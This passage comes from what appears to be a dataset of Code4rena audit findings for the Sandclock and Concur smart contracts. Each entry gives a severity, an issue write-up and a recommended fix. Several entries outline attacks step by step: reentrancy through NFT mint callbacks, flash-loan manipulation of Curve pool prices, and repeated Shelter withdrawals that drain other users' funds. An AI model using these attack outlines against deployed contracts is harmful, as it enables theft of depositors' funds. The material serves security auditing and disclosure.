As we stated in issue [#166](https://github.com/code-423n4/2022-01-sandclock-findings/issues/166), when the value of `totalShares` is manipulated precisely, the attacker can plant a bomb, and the contract will not work when the deposit/withdraw amount reaches a certain value, freezing the user's funds.

However, this issue is not caused by lack of reentrancy protection, therefore it cant be solved by the same solution in issue [#166](https://github.com/code-423n4/2022-01-sandclock-findings/issues/166).

#### Recommendation

Consider adding a minimum balance reserve (eg. 1e18 Wei) that cannot be withdrawn by anyone in any case. It can be transferred in alongside with the deployment by the deployer.

This should make it safe or at least make it extremely hard or expensive for the attacker to initiate such an attack."
67.md,Withdrawers can get more value returned than expected with reentrant call,high,"The impact of this is that users can get significantly more UST withdrawn than they would be alotted if they had done non-reentrant withdraw calls.

#### Proof of Concept

Here's an outline of the attack:

Assume the vault has 100 UST in it.
The attacker makes two deposits of 100UST and waits for them to be withdrawable.
The attacker triggers a withdraw one of their deposit positions.
The vault code executes until it reaches this point: <https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L565>
Since the attacker is the claimer, the vault will call back to the attacker.
Inside `onDepositBurned`, trigger another 100 UST deposit.
Since `claimers.onWithdraw` has already been called, reducing the amount of shares, but the UST hasn't been transferred yet, the vault will compute the amount of UST to be withdrawn based on an unexpected value for `_totalUnderlyingMinusSponsored` (300).
<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L618>

After the attack, the attacker will have significantly more than if they had withdrawn without reentrancy.

Here's my proof of concept showing a very similar exploit with `deposit`, but I think it's enough to illustrate the point. I have a forge repo if you want to see it, just ping me on discord.
<https://gist.github.com/CamdenClark/abc67bc1b387c15600549f6dfd5cb27a>

#### Tools Used

Forge

#### Recommended Mitigation Steps

Reentrancy guards.

Also, consider simplifying some of the shares logic."
67.md,Vaults with non-UST underlying asset vulnerable to flash loan attack on curve pool,high,"In short, the `NonUSTStrategy` is vulnerable to attacks by flash loans on curve pools.

Here's an outline of the attack:

*   Assume there is a vault with DAI underlying and a `NonUSTStrategy` with a DAI / UST curve pool
*   Take out a flash loan of DAI
*   Exchange a ton of DAI for UST
*   The exchange rate from DAI to UST has gone up (!!)
*   Withdraw or deposit from vault with more favorable terms than market
*   Transfer back UST to DAI
*   Repay flash loan

#### Proof of Concept

Here is my proof of concept:
<https://gist.github.com/CamdenClark/932d5fbeecb963d0917cb1321f754132>

I can provide a full forge repo. Just ping me on discord.

Exploiting this line: <https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/strategy/NonUSTStrategy.sol#L135>

#### Tools Used

Forge

#### Recommended Mitigation Steps

Use an oracle"
67.md,deposit() function is open to reentrancy attacks,high,"In `Vault.sol` the `deposit()` function is left wide open to reentrancy attacks.  The function eventually calls `\_createDeposit() => \_createClaim()` which calls `depositors.mint()` which will then mint an NFT.  When the NFT is minted the sender will receive a callback which can then be used to call the `deposit()` function again before execution is finished.  An attacker can do this minting multiple NFT's for themselves.  `claimers.mint()` is also called in the same function which can also be used to call back into the deposit function before execution is complete.  Since there are several state updates before and after NFT's are minted this can be used to further manipulate the protocol like with `newShares` which is called before minting.  This is not counting what an attacker can do with cross function reentrancy entering into several other protocol functions (like withdraw) before code execution is complete further manipulating the system.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L160>

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L470>

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L476>

#### Recommended Mitigation Steps

Reentrancy guard modifiers should be placed on the `deposit()`, `withdraw()` and all other important protocol functions to prevent devastating attacks."
67.md,sponsor() function in open to reentrancy attacks,high,"In `Vault.sol` the `sponsor()` function does not have a reentrancy guard allowing an attacker to reenter the function because the `depositors.mint()` function has as callback to the msg.sender.  Since there are state updates after the call to `depositors.mint()` function this is especially dangerous.  An attacker can make it so the totalSponsored amount is only updated once after calling `mint()` several times since the update takes place after the callback.  The same will be true for the Sponsored event that is emitted.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L244>

#### Recommended Mitigation Steps

A reentrancy guard modifier should be added to the sponsor() function in Vault.sol"
67.md,Late users will take more losses than expected when the underlying contract (`EthAnchor`) suffers investment losses,medium,"Even though it's unlikely in practice, but in theory, the underlying contract (`EthAnchor`) may suffer investment losses and causing decreasing of the PPS of AUST token. (There are codes that considered this situation in the codebase. eg. handling of `depositShares > claimerShares`).

However, when this happens, the late users will suffer more losses than expected than the users that withdraw earlier. The last few users may lose all their funds while the first users can get back 100% of their deposits.

#### Proof of Concept

    // ### for deposits: d1, d2, d3, the beneficiary are: c1, c2, c2
        depositAmount          claimerShares
    d1: + 100e18           c1: + 100e36
    d2: + 100e18           c2: + 100e36
    d3: + 100e18           c2: + 100e36

    depositAmount of d1, d2, d3 = 100e18
    c1 claimerShares: 100e36
    c2 claimerShares: 200e36
    total shares: 300e36


    // ### when the PPS of AUST drop by 50% 
    totalUnderlyingMinusSponsored: 300e18 -> 150e18

    // ### d2 withdraw
    c2 claimerShares: 200e36
    d2 depositAmount: 100e18
    d2 depositShares: 300e36 * 100e18 / 150e18 = 200e36

    Shares to reduce: 200e36
    c2 claimerShares: 200e36 -> 0
    c2 totalPrincipal: 200e18 -> 100e18
    totalShares: 300e36 -> 100e36

    underlying.safeTransfer(d2, 100e18)
    totalUnderlyingMinusSponsored: 150e18 -> 50e18

#### Root Cause

When the strategy is losing money, `share / underlying` increases, therefore the computed `depositShares`: `depositAmount * share / underlying` will increase unexpectedly.

<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L544-L548>

While `totalShares` remain unchanged, but the computed `depositShares` is increasing, causing distortion of `depositShares / totalShares`, eg, `∑ depositShares > totalShares`.

#### Recommendation

In order to properly handle the investment loss of the strategy, consider adding a new storage variable called `totalLoss` to maintain a stable value of `share / adjustedUnderlying`.

```solidity
adjustedUnderlying = underlying + totalLoss
```"
67.md,`NonUSTStrategy.sol` Improper handling of swap fees allows attacker to steal funds from other users,medium,"<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/strategy/NonUSTStrategy.sol#L66-L69>

`NonUSTStrategy` will swap the deposited non-UST assets into UST before depositing to EthAnchor. However, the swap fee is not attributed to the depositor correctly like many other yield farming vaults involving swaps (`ZapIn`).

An attacker can exploit it for the swap fees paid by other users by taking a majority share of the liquidity pool.

#### Root Cause

The swap fee of depositing is not paid by the depositor but evenly distributed among all users.

#### Proof of Concept

Given:

*   A NonUST vault and strategy is created for `FRAX`;
*   The liquidity in FRAX-UST curve pool is relatively small (<\$1M).

The attacker can do the following:

1.  Add \$1M worth of liquidity to the FRAX-UST curve pool, get >50% share of the pool;
2.  Deposit 1M FRAX to the vault, get a `depositAmount` of 1M;
3.  The strategy will swap 1M FRAX to UST via the curve pool, paying a certain amount of swap fee;
4.  Withdraw all the funds from the vault.
5.  Remove the liquidity added in step 1, profit from the swap fee. (A majority portion of the swap fee paid in step 3 can be retrieved by the attacker as the attacker is the majority liquidity provider.)

If the vault happens to have enough balance (from a recent depositor), the attacker can now receive 1M of FRAX.

A more associated attacker may combine this with issue [#160](https://github.com/code-423n4/2022-01-sandclock-findings/issues/160) and initiate a sandwich attack in step 3 to get even higher profits.

As a result, all other users will suffer fund loss as the swap fee is essentially covered by other users.

#### Recommendation

Consider changing the way new shares are issued:

1.  Swap from Vault asset (eg. FRAX) to UST in `deposit()`;
2.  Using the UST amount out / total underlying UST for the amount of new shares issued to the depositor.

In essence, the depositor should be paying for the swap fee and slippage."
67.md,Centralization Risk: Funds can be frozen when critical key holders lose access to their keys,medium,"The current implementation requires trusted key holders (`isTrusted[msg.sender]`) to send transactions (`initRedeemStable()`) to initialize withdrawals from `EthAnchor` before the users can withdraw funds from the contract.

- <https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/strategy/BaseStrategy.sol#L214-L223>

- <https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/strategy/BaseStrategy.sol#L163-L170>

This introduces a high centralization risk, which can cause funds to be frozen in the contract if the key holders lose access to their keys.

#### Proof of Concept

Given:

*   `investPerc` = 80%
*   1,000 users deposited 1M UST in total (\$1000 each user in avg), 800k invested into AUST (`EthAnchor`)

If the key holders lose access to their keys (""hit by a bus""). The 800k will be frozen in `EthAnchor` as no one can `initRedeemStable()`.

#### Recommendation

See the recommendation on issue [#157](https://github.com/code-423n4/2022-01-sandclock-findings/issues/157)."
67.md,"unsponsor, claimYield and withdraw might fail unexpectedly",medium,"`totalUnderlying()` includes the invested assets, they are not in the contract balance.

when a user calls withdraw, claimYield or unsponsor, the system might not have enough assets in the balance and the transfer would fail.

especially, force unsponsor will always fail, because it tries to transfer the entire `totalUnderlying()`, which the system doesn't have:

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L391>

#### Recommended Mitigation Steps

when the system doesn't have enough balance to make the transfer, withdraw from the strategy."
67.md,Add a timelock to `BaseStrategy:setPerfFeePct`,medium,"To give more trust to users: functions that set key/critical variables should be put behind a timelock.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L249-L253>

#### Tools Used

VS Code

#### Recommended Mitigation Steps

Add a timelock to setter functions of key/critical variables."
67.md,`totalUnderlyingMinusSponsored()` may revert on underflow and malfunction the contract,medium,"<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L290-L293>

```solidity
function totalUnderlyingMinusSponsored() public view returns (uint256) {
    // TODO no invested amount yet
    return totalUnderlying() - totalSponsored;
}
```

As a function that many other functions depended on, `totalUnderlyingMinusSponsored()` can revert on underflow when  `sponsorAmount > totalUnderlying()` which is possible and has been considered elsewhere in this contract:

<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L390-L392>

```solidity
if (_force && sponsorAmount > totalUnderlying()) {
    sponsorToTransfer = totalUnderlying();
}
```

#### Proof of Concept

*   Underlying token = USDT
*   Swap Fee = 0.04%

1.  Sponsor call `sponsor()` and send 10,000 USDT

*   totalSponsored = 10,000

2.  `NonUSTStrategy.sol#doHardWork()` swapped USDT for UST

*   pendingDeposits = 9,996
*   totalUnderlying() = 9,996

3.  Alice tries to call `deposit()`, the tx will revet due to underflow in `totalUnderlyingMinusSponsored()`.

#### Recommendation

Change to:

```solidity
function totalUnderlyingMinusSponsored() public view returns (uint256) {
    uint256 _totalUnderlying = totalUnderlying();
    if (totalSponsored > _totalUnderlying) {
        return 0;
    }
    return _totalUnderlying - totalSponsored;
}
```"
67.md,Vault can't receive deposits if underlying token charges fees on transfer,medium,"Some ERC20 tokens charge a fee for every transfer. If the underlying token of a vault is such a token any deposit to the protocol will fail.

Some tokens have the possibility of adding fees later on, e.g. USDT. So those have to be covered too.

Generally, the user would also receive fewer tokens on withdrawing in such a scenario but that's not the protocol's fault.

I rated the issue as medium since part of the protocol become unavailable in such a situation.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L583-L585>

`_transferAndCheckUnderlying()` is used to deposit and sponsor the vault. It checks that after a `safeTransferFrom()` the same exact amount is sent to the balance of the vault. But, if fees are enabled the values won't match, causing the function to revert. Thus, it won't be able to deposit or sponsor the vault in any way.

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L162>

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L266>

#### Recommended Mitigation Steps

One possibility would be to simply not use ERC20 tokens with fees."
67.md,Medium: Consider alternative price feed + ensure _minLockPeriod > 0 to prevent flash loan attacks,medium,"It is critical to ensure that `_minLockPeriod > 0` because it is immutable and cannot be changed once set. A zero `minLockPeriod` will allow for flash loan attacks to occur. Vaults utilising the nonUST strategy are especially susceptible to this attack vector since the strategy utilises the spot price of the pool to calculate the total asset value.

#### Proof of Concept

Assume the vault’s underlying token is MIM, and the curve pool to be used is the MIM-UST pool. Further assume that both the vault and the strategy holds substantial funds in MIM and UST respectively.

1.  Flash loan MIM from the [Uniswap V3 MIM-USDC pool](https://etherscan.io/address/0x298b7c5e0770d151e4c5cf6cca4dae3a3ffc8e27) (currently has \~\$3.5M in MIM at the time of writing).
2.  Convert half of the loaned MIM to UST to inflate and deflate their prices respectively.
3.  Deposit the other half of the loaned MIM into the vault. We expect `curvePool.get_dy_underlying(ustI, underlyingI, ustAssets);` to return a smaller amount than expected because of the previous step. As a result, the attacker is allocated more shares than expected.
4.  Exchange UST back to MIM, bringing back the spot price of MIM-UST to a normal level.
5.  Withdraw funds from the vault. The number of shares to be deducted is lower as a result of (4), with the profit being accounted for as yield.
6.  Claim yield and repay the flash loan.

#### Recommended Mitigation Steps

Ensure that `_minLockPeriod` is non-zero in the constructor. Also, given how manipulatable the spot price of the pool can be, it would be wise to consider an alternative price feed.

```jsx
// in Vault#constructor
require(_minLockPeriod > 0, 'zero minLockPeriod');
```"
67.md,no use of safeMint() as safe guard for users,medium,"In `Vault.sol` the `deposit()` function eventually calls claimers.mint() and depositers.mint().  Calling mint this way does not ensure that the receiver of the NFT is able to accept them.  `\_safeMint()` should be used with reentrancy guards as a guard to protect the user as it checks to see if a user can properly accept an NFT and reverts otherwise.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L470>

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L256>

- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L248>

#### Recommended Mitigation Steps

Use `\_safeMint()` instead of `mint()`"
67.md,"No setter for exchangeRateFeeder, whose address might change in future",medium,"EthAnchor's docs state that ""the contract address of ExchangeRateFeeder may change as adjustments occur"".
BaseStrategy does not have a setter to change exchangeRateFeeder after deployment.

#### Impact

Inaccurate/unupdated values from exchangeRateFeeder when calculating vault's total invested assets.

While the strategy's funds could be withdrawn from EthAnchor and migrated to a new strategy with correct exchangeRateFeeder, during this process (which might take time due to EthAnchor's async model) the wrong exchangeRateFeeder will be used to calculate the vault's total invested assets. (The vault's various actions (deposit, claim, withdraw) can not be paused.)

#### Proof of Concept

The exchangeRateFeeder is being used to calculate the vault's invested assets, which is used extensively to calculate the correct amount of shares and amounts: [(Code ref)](https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L275)
```solidity
function investedAssets() external view virtual override(IStrategy) returns (uint256) {
    uint256 underlyingBalance = _getUnderlyingBalance() + pendingDeposits;
    uint256 aUstBalance = _getAUstBalance() + pendingRedeems;

    return underlyingBalance + ((exchangeRateFeeder.exchangeRateOf(address(aUstToken), true) 
            * aUstBalance) / 1e18);
}
```

EthAnchor documentation states that unlike other contracts, exchangeRateFeeder is not proxied and it's address may change in future: ""the contract address of ExchangeRateFeeder may change as adjustments occur.
"" [(ref)](https://docs.anchorprotocol.com/ethanchor/ethanchor-contracts/deployed-contracts#core-contracts)

#### Recommended Mitigation Steps

Add a setter for exchangeRateFeeder."
67.md,Changing a strategy can be bricked,medium,"A vault wouldn't let the strategy be changed unless the strategy holds no funds.

Since anybody can send funds to the strategy, a griefing attack is possible.

#### Impact

Strategy couldn't be changed.

#### Proof of Concept

`setStrategy` requires `strategy.investedAssets() == 0`. [(Code ref)](https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L113:#L116)
`investedAssets` contains the aUST balance and the pending redeems: [(Code ref)](https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L271)

    uint256 aUstBalance = _getAUstBalance() + pendingRedeems;

So if a griefer sends 1 wei of aUST to the strategy before it is to be replaced, it would not be able to be replaced. The protocol would then need to redeem the aUST and wait for the process to finish - and the griefer can repeat his griefing. As they say, griefers gonna grief.

#### Recommended Mitigation Steps

Consider keeping an internal aUST balance of the strategy, which will be updated upon deposit and redeem, and use it (instead of raw aUST balance) to check if the strategy holds no aUST funds.

Another option is to add capability for the strategy to send the aUST to the vault."
67.md,`investedAssets()` Does Not Take Into Consideration The Performance Fee Charged On Strategy Withdrawals,medium,"The `investedAssets()` function is implemented by the vault's strategy contracts as a way to express a vault's investments in terms of the underlying currency. While the implementation of this function in `BaseStrategy.sol` and `NonUSTStrategy.sol` is mostly correct. It does not account for the performance fee charged by the treasury as shown in `finishRedeemStable()`.

Therefore, an attacker could avoid paying their fair share of the performance fee by withdrawing their assets before several calls to `finishRedeemStable()` are made and reenter the vault once the fee is charged.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L180-L204>
```solidity
function finishRedeemStable(uint256 idx) public virtual {
    require(redeemOperations.length > idx, ""not running"");
    Operation storage operation = redeemOperations[idx];
    uint256 aUstBalance = _getAUstBalance() + pendingRedeems;
    uint256 originalUst = (convertedUst * operation.amount) / aUstBalance;
    uint256 ustBalanceBefore = _getUstBalance();

    ethAnchorRouter.finishRedeemStable(operation.operator);

    uint256 redeemedAmount = _getUstBalance() - ustBalanceBefore;
    uint256 perfFee = redeemedAmount > originalUst
        ? (redeemedAmount - originalUst).percOf(perfFeePct)
        : 0;
    if (perfFee > 0) {
        ustToken.safeTransfer(treasury, perfFee);
        emit PerfFeeClaimed(perfFee);
    }
    convertedUst -= originalUst;
    pendingRedeems -= operation.amount;

    operation.operator = redeemOperations[redeemOperations.length - 1]
        .operator;
    operation.amount = redeemOperations[redeemOperations.length - 1].amount;
    redeemOperations.pop();
}
```
<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L263-L277>
```solidity
function investedAssets()
    external
    view
    virtual
    override(IStrategy)
    returns (uint256)
{
    uint256 underlyingBalance = _getUnderlyingBalance() + pendingDeposits;
    uint256 aUstBalance = _getAUstBalance() + pendingRedeems;

    return
        underlyingBalance +
        ((exchangeRateFeeder.exchangeRateOf(address(aUstToken), true) *
            aUstBalance) / 1e18);
}
```

<https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/NonUSTStrategy.sol#L120-L136>
```solidity
function investedAssets()
    external
    view
    override(BaseStrategy)
    returns (uint256)
{
    uint256 underlyingBalance = _getUnderlyingBalance();
    uint256 aUstBalance = _getAUstBalance() + pendingRedeems;

    uint256 ustAssets = ((exchangeRateFeeder.exchangeRateOf(
        address(aUstToken),
        true
    ) * aUstBalance) / 1e18) + pendingDeposits;
    return
        underlyingBalance +
        curvePool.get_dy_underlying(ustI, underlyingI, ustAssets);
}
```

#### Tools Used

Manual code review.
Discussions with the Sandclock team (mostly Ryuhei).

#### Recommended Mitigation Steps

When calculating the `investedAssets()` amount (expressed in the underlying currency), consider calculating the expected performance fee to be charged if all the strategy's assets are withdrawn from the Anchor protocol. This should ensure that `investedAssets()` returns the most accurate amount, preventing users from gaming the protocol."
67.md,Incompatibility With Rebasing/Deflationary/Inflationary tokens,medium,"The Strategy contracts do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.

#### Proof of Concept

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L239>

- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/strategy/BaseStrategy.sol#L221>

#### Recommended Mitigation Steps

- Make sure token vault accounts for any rebasing/inflation/deflation
- Add support in contracts for such tokens before accepting user-supplied tokens
- Consider to check before/after balance on the vault."
67.md,A Single Malicious Trusted Account Can Takeover Parent Contract,medium,"The `requiresTrust()` modifier is used on the strategy, vault and factory contracts to prevent unauthorised accounts from calling restricted functions. Once an account is considered trusted, they are allowed to add and remove accounts by calling `setIsTrusted()` as they see fit.

However, if any single account has its private keys compromised or decides to become malicious on their own, they can remove all other trusted accounts from the `isTrusted` mapping. As a result, they are effectively able to take over the trusted group that controls all restricted functions in the parent contract.

#### Proof of Concept
```solidity
abstract contract Trust {
    event UserTrustUpdated(address indexed user, bool trusted);

    mapping(address => bool) public isTrusted;

    constructor(address initialUser) {
        isTrusted[initialUser] = true;

        emit UserTrustUpdated(initialUser, true);
    }

    function setIsTrusted(address user, bool trusted) public virtual requiresTrust {
        isTrusted[user] = trusted;

        emit UserTrustUpdated(user, trusted);
    }

    modifier requiresTrust() {
        require(isTrusted[msg.sender], ""UNTRUSTED"");

        _;
    }
}
```

#### Recommended Mitigation Steps

Consider utilising Rari Capital's updated `Auth.sol` contract found [here](https://github.com/Rari-Capital/solmate/blob/main/src/auth/Auth.sol). This updated contract gives the `owner` account authority over its underlying trusted accounts, preventing any single account from taking over the trusted group. The `owner` account should point to a multisig managed by the Sandclock team or by a community DAO."
67.md,Check _to is not empty,medium,"functions `claimYield`, `\_withdraw`, and `\_unsponsor` should validate that `\_to` is not an empty 0x0 address to prevent accidental burns.

#### Recommended Mitigation Steps

Consider implementing the proposed validation:
require `\_to != address(0)`"
83.md,Wrong reward token calculation in MasterChef contract,high,"[MasterChef.sol#L86](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L86)<br>

When adding new token pool for staking in MasterChef contract

```javascript
function add(address _token, uint _allocationPoints, uint16 _depositFee, uint _startBlock)
```

All other, already added, pools should be updated but currently they are not.<br>
Instead, only totalPoints is updated. Therefore, old (and not updated) pools will lose it's share during the next update.<br>
Therefore, user rewards are not computed correctly (will be always smaller).

### Proof of Concept

Scenario 1:

1.  Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100)<br>
    and 1 block later Alice stakes 10 tokens in the first pool.
2.  1 week passes
3.  Alice withdraws her 10 tokens and claims X amount of reward tokens.<br>
    and 1 block later Bob stakes 10 tokens in the first pool.
4.  1 week passes
5.  Owner adds new pool (second pool) for staking with points = 100 (totalPoints=200)<br>
    and 1 block later Bob withdraws his 10 tokens and claims X/2 amount of reward tokens.<br>
    But he should get X amount

Scenario 2:

1.  Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100).
2.  1 block later Alice, Bob and Charlie stake 10 tokens there (at the same time).
3.  1 week passes
4.  Owner adds new pool (second pool) for staking with points = 400 (totalPoints=500)
5.  Right after that, when Alice, Bob or Charlie wants to withdraw tokens and claim rewards they will only be able to claim 20% of what they should be eligible for, because their pool is updated with 20% (100/500) rewards instead of 100% (100/100) rewards for the past week.

### Recommended Mitigation Steps

Update all existing pools before adding new pool. Use the massUdpate() function which is already present ... but unused.






***"
83.md,Masterchef: Improper handling of deposit fee,high,"[MasterChef.sol#L170-L172](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L170-L172)<br>

If a pool’s deposit fee is non-zero, it is subtracted from the amount to be credited to the user.

```jsx
if (pool.depositFeeBP > 0) {
  uint depositFee = _amount.mul(pool.depositFeeBP).div(_perMille);
  user.amount = SafeCast.toUint128(user.amount + _amount - depositFee);
}
```

However, the deposit fee is not credited to anyone, leading to permanent lockups of deposit fees in the relevant depositor contracts (StakingRewards and ConvexStakingWrapper for now).

### Proof of Concept

#### Example 1: ConvexStakingWrapper

Assume the following

*   The [curve cDai / cUSDC / cUSDT LP token](https://etherscan.io/address/0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23) corresponds to `pid = 1` in the convex booster contract.
*   Pool is added in Masterchef with `depositFeeBP = 100 (10%)`.

1.  Alice deposits 1000 LP tokens via the ConvexStakingWrapper contract. A deposit fee of 100 LP tokens is charged. Note that the `deposits` mapping of the ConvexStakingWrapper contract credits 1000 LP tokens to her.
2.  However, Alice will only be able to withdraw 900 LP tokens. The 100 LP tokens is not credited to any party, and is therefore locked up permanently (essentially becomes protocol-owned liquidity). While she is able to do `requestWithdraw()` for 1000 LP tokens, attempts to execute `withdraw()` with amount = 1000 will revert because she is only credited 900 LP tokens in the Masterchef contract.

#### Example 2: StakingRewards

*   CRV pool is added in Masterchef with `depositFeeBP = 100 (10%)`.

1.  Alice deposits 1000 CRV into the StakingRewards contract. A deposit fee of 100 CRV is charged.
2.  Alice is only able to withdraw 900 CRV tokens, while the 100 CRV is not credited to any party, and is therefore locked up permanently.

These examples are non-exhaustive as more depositors can be added / removed from the Masterchef contract.

### Recommended Mitigation Steps

I recommend shifting the deposit fee logic out of the masterchef contract into the depositor contracts themselves, as additional logic would have to be added in the masterchef to update the fee recipient’s state (rewardDebt, send pending concur rewards, update amount), which further complicates matters. As the fee recipient is likely to be the treasury, it is also not desirable for it to accrue concur rewards.

```jsx
if (pool.depositFeeBP > 0) {
  uint depositFee = _amount.mul(pool.depositFeeBP).div(_perMille);
  user.amount = SafeCast.toUint128(user.amount + _amount - depositFee);
  UserInfo storage feeRecipient = userInfo[_pid][feeRecipient];
  // TODO: update and send feeRecipient pending concur rewards
  feeRecipient.amount = SafeCast.toUint128(feeRecipient.amount + depositFee);
  // TODO: update fee recipient's rewardDebt
}
```






***"
83.md,Repeated Calls to Shelter.withdraw Can Drain All Funds in Shelter,high,"[Shelter.sol#L52-L57](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L52-L57)<br>

tl;dr Anyone who can call `withdraw` to withdraw their own funds can call it repeatedly to withdraw the funds of others. `withdraw` should only succeed if the user hasn't withdrawn the token already.

The shelter can be used for users to withdraw funds in the event of an emergency. The `withdraw` function allows callers to withdraw tokens based on the tokens they have deposited into the shelter client: ConvexStakingWrapper. However, `withdraw` does not check if a user has already withdrawn their tokens. Thus a user that can `withdraw` tokens, can call withdraw repeatedly to steal the tokens of others.

### Proof of Concept

tl;dr an attacker that can successfully call `withdraw` once on a shelter, can call it repeatedly to steal the funds of others. Below is a detailed scenario where this situation can be exploited.

1.  Mallory deposits 1 `wETH` into `ConvexStakingWrapper` using [`deposit`](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L280). Let's also assume that other users have deposited 2 `wETH` into the same contract.
2.  An emergency happens and the owner of `ConvexStakingWrapper` calls `setShelter(shelter)` and `enterShelter([pidOfWETHToken, ...])`. Now `shelter` has 3 `wETH` and is activated for `wETH`.
3.  Mallory calls `shelter.withdraw(wETHAddr, MalloryAddr)`, Mallory will rightfully receive 1 wETH because her share of wETH in the shelter is 1/3.
4.  Mallory calls `shelter.withdraw(wETHAddr, MalloryAddr)` again, receiving 1/3\*2 = 2/3 wETH. `withdraw` does not check that she has already withdrawn. This time, the wETH does not belong to her, she has stolen the wETH of the other users. She can continue calling `withdraw` to steal the rest of the funds

### Recommended Mitigation Steps

To mitigate this, `withdraw` must first check that `msg.sender` has not withdrawn this token before and `withdraw` must also record that `msg.sender` has withdrawn the token.
The exact steps for this are below:

1.  Add the following line to the beginning of `withdraw` (line 53):

<!---->

    require(!claimed[_token][msg.sender], ""already claimed"")

2.  Replace [line 55](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L55) with the following:

<!---->

    claimed[_token][msg.sender] = true;

This replacement is necessary because we want to record who is withdrawing, not where they are sending the token which isn't really useful info.






***"
83.md,"`ConvexStakingWrapper`, `StakingRewards` Wrong implementation will send `concur` rewards to the wrong receiver",high,"[ConvexStakingWrapper.sol#L246](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/ConvexStakingWrapper.sol#L246)<br>
[StakingRewards.sol#L99](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L99)<br>
[MasterChef.sol#L159-L167](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L159-L167)<br>

```solidity
UserInfo storage user = userInfo[_pid][_msgSender()];
updatePool(_pid);

if(user.amount > 0) {  
    uint pending = user.amount * pool.accConcurPerShare / _concurShareMultiplier - user.rewardDebt;
    if (pending > 0) {
        safeConcurTransfer(_recipient, pending);
    }
}
```

`ConvexStakingWrapper`, `StakingRewards` is using `masterChef.deposit()`, `masterChef.withdraw()`, and these two functions on `masterChef` will take `_msgSender()` as the user address, which is actually the address of `ConvexStakingWrapper` and `StakingRewards`.

As a result, when calling `ConvexStakingWrapper.deposit()`, `ConvexStakingWrapper.withdraw()`, `StakingRewards.stake()`, `StakingRewards.withdraw()`, the `concur` rewards belongs to all the users of ConvexStakingWrapper / StakingRewards will be sent to the caller wrongfully.

### Proof of Concept

1.  Alice deposits `1,000,000` token to `pid 1`

Actual results on `masterChef`:

*   userInfo\[1]\[address(ConvexStakingWrapper)] = `1,000,000`

Expected results:

*   userInfo\[1]\[address(Alice)] = `1,000,000`

2.  1 day later, Bob deposits `1` token to `pid 1`

Actual results on `masterChef`:

*   userInfo\[1]\[address(ConvexStakingWrapper)] = `1,000,001`
*   all `pending rewards` sent to Bob

Expected results:

*   userInfo\[1]\[address(Alice)] = `1,000,000`

*   userInfo\[1]\[address(Bob)] = `1`

*   all `pending rewards` should be sent to Alice

### Recommended Mitigation Steps

Consider adding two new functions to MasterChef: `depositFor()` and `withdrawFor()`.

